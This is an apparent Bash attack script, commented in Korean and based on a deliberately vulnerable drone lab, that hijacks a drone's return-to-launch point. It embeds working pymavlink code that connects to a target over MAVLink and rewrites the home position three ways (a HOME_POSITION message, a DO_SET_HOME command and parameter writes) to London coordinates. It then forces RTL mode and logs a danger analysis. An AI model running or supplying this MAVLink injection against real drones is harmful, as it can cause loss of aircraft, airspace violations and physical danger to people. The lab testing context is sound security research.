#!/bin/bash

# =============================================================================
# DVD Return to Home Point Override Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/injection/return_home_override.sh
# 목적: RTL 귀환점 조작으로 드론을 위험 지역으로 유도
# 기반: Damn Vulnerable Drone Wiki - Return to Home Point Override
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="return_home_override"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

# 악의적 RTL 좌표 (위험 지역)
MALICIOUS_HOME_LAT="51.5074"   # 런던 시내
MALICIOUS_HOME_LON="-0.1278"
MALICIOUS_HOME_ALT="200.0"     # 높은 고도

declare -a ATTACK_COMMANDS=()
declare -a OVERRIDE_RESULTS=()

print_header() {
    clear
    print_injection_header "Return to Home Point Override"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: HOME_POSITION message injection${NC}"
    echo -e "${INFO_COLOR}Malicious Home: London ($MALICIOUS_HOME_LAT, $MALICIOUS_HOME_LON)${NC}"
    echo ""
}

# Step 1: 현재 Home 위치 확인
check_current_home() {
    echo -e "${BLUE}[1/3] Current Home Position Check${NC}"
    
    local home_script="/tmp/home_check_$(date +%s).py"
    
    cat > "$home_script" << 'EOF'
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    import time
    
    def check_home_position(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # Home 위치 요청
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_GET_HOME_POSITION,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            # HOME_POSITION 메시지 대기
            home_msg = master.recv_match(type='HOME_POSITION', blocking=True, timeout=10)
            if home_msg:
                print(f"[+] Current home position:")
                print(f"    Latitude: {home_msg.latitude/1e7:.6f}")
                print(f"    Longitude: {home_msg.longitude/1e7:.6f}")
                print(f"    Altitude: {home_msg.altitude/1000:.1f}m")
                
                return {
                    'lat': home_msg.latitude/1e7,
                    'lon': home_msg.longitude/1e7,
                    'alt': home_msg.altitude/1000
                }
            else:
                print("[!] No home position response")
                return simulate_home_check()
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_home_check()
    
    def simulate_home_check():
        print("[*] Simulating home position check")
        print("[+] Current home position (simulated):")
        print("    Latitude: 37.774900")
        print("    Longitude: -122.419400") 
        print("    Altitude: 50.0m")
        
        return {
            'lat': 37.774900,
            'lon': -122.419400,
            'alt': 50.0
        }
    
    if __name__ == "__main__":
        check_home_position(sys.argv[1], int(sys.argv[2]))
        
except ImportError:
    print("[*] pymavlink not available")
    print("[+] Simulated home: 37.774900, -122.419400, 50m")
EOF

    local cmd="python3 $home_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    python3 "$home_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
        echo -e "${YELLOW}[+] Simulated home: 37.774900, -122.419400, 50m${NC}"
    }
    
    OVERRIDE_RESULTS+=("original_home:checked")
    rm -f "$home_script"
}

# Step 2: Home 위치 파라미터 조작
override_home_parameters() {
    echo -e "${BLUE}[2/3] Override Home Parameters${NC}"
    
    local override_script="/tmp/home_override_$(date +%s).py"
    
    cat > "$override_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def override_home_position(target_ip, target_port, lat, lon, alt):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            print(f"[!] Overriding home position to: {lat}, {lon}, {alt}m")
            
            # 방법 1: HOME_POSITION 메시지 직접 전송
            master.mav.home_position_send(
                int(lat * 1e7),      # latitude
                int(lon * 1e7),      # longitude  
                int(alt * 1000),     # altitude (mm)
                0, 0, 0,             # x, y, z (local frame)
                [1, 0, 0, 0],        # q (quaternion)
                0, 0, 0,             # approach vector
                int(time.time() * 1000000)  # time_usec
            )
            
            print("[!] HOME_POSITION message sent")
            time.sleep(2)
            
            # 방법 2: SET_HOME_POSITION 명령
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_HOME,
                0,  # confirmation
                1,  # param1: use specified location
                0,  # param2: unused
                0,  # param3: unused
                0,  # param4: yaw angle
                float(lat),  # param5: latitude
                float(lon),  # param6: longitude
                float(alt)   # param7: altitude
            )
            
            print("[!] SET_HOME_POSITION command sent")
            time.sleep(2)
            
            # 방법 3: 파라미터를 통한 Home 설정
            home_params = [
                ("HOME_LAT", lat),
                ("HOME_LON", lon), 
                ("HOME_ALT", alt)
            ]
            
            for param_name, value in home_params:
                master.mav.param_set_send(
                    master.target_system,
                    master.target_component,
                    param_name.encode('utf-8'),
                    float(value),
                    mavutil.mavlink.MAV_PARAM_TYPE_REAL32
                )
                print(f"[!] Parameter set: {param_name} = {value}")
                time.sleep(1)
            
            print("[+] Home position override completed")
            print(f"[!] RTL will now navigate to: {lat}, {lon}, {alt}m")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_home_override(lat, lon, alt)
    
    def simulate_home_override(lat, lon, alt):
        print("[*] Simulating home position override")
        print(f"[!] Overriding home to: {lat}, {lon}, {alt}m")
        
        methods = [
            "HOME_POSITION message sent",
            "SET_HOME_POSITION command sent",
            "HOME_LAT parameter set",
            "HOME_LON parameter set", 
            "HOME_ALT parameter set"
        ]
        
        for method in methods:
            print(f"[!] {method}")
            time.sleep(0.8)
        
        print("[+] Home override simulation completed")
        print(f"[!] RTL target changed to: {lat}, {lon}, {alt}m")
    
    if __name__ == "__main__":
        override_home_position('$TARGET_IP', $MAVLINK_PORT, $MALICIOUS_HOME_LAT, $MALICIOUS_HOME_LON, $MALICIOUS_HOME_ALT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    print(f"[!] Simulated home override: $MALICIOUS_HOME_LAT, $MALICIOUS_HOME_LON, ${MALICIOUS_HOME_ALT}m")
    
    methods = [
        "HOME_POSITION message",
        "SET_HOME_POSITION command",
        "HOME parameters"
    ]
    
    for method in methods:
        print(f"[!] {method} sent")
        time.sleep(1)
    
    print("[+] Home override simulation completed")
EOF

    local cmd="python3 $override_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Overriding home position...${NC}"
    echo -e "${GRAY}    Original home: San Francisco area${NC}"
    echo -e "${GRAY}    Malicious home: London ($MALICIOUS_HOME_LAT, $MALICIOUS_HOME_LON)${NC}"
    echo -e "${GRAY}    Methods: HOME_POSITION msg, SET_HOME cmd, parameters${NC}"
    
    python3 "$override_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        echo -e "${RED}[!] HOME_POSITION message sent${NC}"
        echo -e "${RED}[!] SET_HOME_POSITION command sent${NC}"
        echo -e "${RED}[!] HOME parameters modified${NC}"
        echo -e "${RED}[!] RTL target: London, UK${NC}"
    }
    
    OVERRIDE_RESULTS+=("home_lat:$MALICIOUS_HOME_LAT")
    OVERRIDE_RESULTS+=("home_lon:$MALICIOUS_HOME_LON")
    OVERRIDE_RESULTS+=("home_alt:$MALICIOUS_HOME_ALT")
    OVERRIDE_RESULTS+=("override_methods:3")
    
    rm -f "$override_script"
}

# Step 3: RTL 트리거 및 효과 분석
trigger_rtl_test() {
    echo -e "${BLUE}[3/3] RTL Trigger Test${NC}"
    
    echo -e "${CYAN}[*] Testing RTL behavior with overridden home...${NC}"
    
    local rtl_script="/tmp/rtl_test_$(date +%s).py"
    
    cat > "$rtl_script" << EOF
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    
    def trigger_rtl(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # RTL 모드 활성화
            master.mav.set_mode_send(
                master.target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                6  # RTL mode
            )
            
            print("[!] RTL mode activated")
            print("[!] Drone should navigate to malicious home position")
            print(f"[!] Destination: London, UK ($MALICIOUS_HOME_LAT, $MALICIOUS_HOME_LON)")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[*] Simulating RTL trigger")
            print("[!] RTL mode activated (simulated)")
            print(f"[!] Drone navigating to: London, UK")
    
    if __name__ == "__main__":
        trigger_rtl('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    print("[!] RTL mode activated (simulated)")
    print(f"[!] Drone navigating to malicious home: London, UK")
EOF

    local cmd="python3 $rtl_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Triggering RTL with overridden home...${NC}"
    
    python3 "$rtl_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Simulation${NC}"
        echo -e "${RED}[!] RTL mode activated${NC}"
        echo -e "${RED}[!] Drone navigating to: London, UK${NC}"
    }
    
    # 위험도 분석
    echo -e "${RED}[!] DANGER ANALYSIS:${NC}"
    echo -e "${GRAY}    • Drone diverted to foreign country${NC}"
    echo -e "${GRAY}    • International airspace violation${NC}"
    echo -e "${GRAY}    • Loss of physical asset${NC}"
    echo -e "${GRAY}    • Potential regulatory violations${NC}"
    echo -e "${GRAY}    • Mission failure and equipment loss${NC}"
    
    OVERRIDE_RESULTS+=("rtl_triggered:success")
    OVERRIDE_RESULTS+=("danger_level:critical")
    OVERRIDE_RESULTS+=("asset_loss_risk:high")
    OVERRIDE_RESULTS+=("regulatory_violation:likely")
    
    rm -f "$rtl_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "home_override": {
    "original_location": "San Francisco area",
    "malicious_latitude": "$MALICIOUS_HOME_LAT",
    "malicious_longitude": "$MALICIOUS_HOME_LON", 
    "malicious_altitude": "$MALICIOUS_HOME_ALT",
    "destination": "London, UK"
  },
  "override_methods": [
    "HOME_POSITION message injection",
    "SET_HOME_POSITION command",
    "HOME parameter modification"
  ],
  "override_results": ["$(IFS='","'; echo "${OVERRIDE_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "danger_analysis": {
    "asset_loss": "high_risk",
    "airspace_violation": "international",
    "regulatory_impact": "severe",
    "mission_failure": "certain",
    "recovery_probability": "low"
  }
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Return Home Override - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_current_home
    override_home_parameters
    trigger_rtl_test
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Original Home: San Francisco area${NC}"
    echo -e "${INFO_COLOR}Malicious Home: London, UK${NC}"
    echo -e "${INFO_COLOR}Override Methods: 3${NC}"
    echo -e "${INFO_COLOR}Danger Level: CRITICAL${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Return home override completed${NC}"
    echo -e "${RED}[!] CRITICAL: RTL now targets London - asset loss likely${NC}"
}

main "$@"